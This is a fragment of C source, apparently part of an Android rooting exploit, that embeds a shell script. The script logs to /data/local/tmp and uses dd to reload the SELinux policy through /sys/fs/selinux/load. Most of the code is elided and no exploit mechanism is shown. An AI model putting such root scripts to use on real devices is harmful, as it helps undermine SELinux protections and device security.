...
static void write_root_script(void) {
  ...
  const char *script =
    "#!/system/bin/sh\n"
    "exec > /data/local/tmp/a/root.log 2>&1\n"
    ...
    "fi\n"
    "sleep 5\n"
    "dd if=/sys/fs/selinux/policy of=/sys/fs/selinux/load bs=8388608 2>/dev/null && echo '[+] policy reloaded (policycap restored)' || echo '[!] policy reload failed'\n"
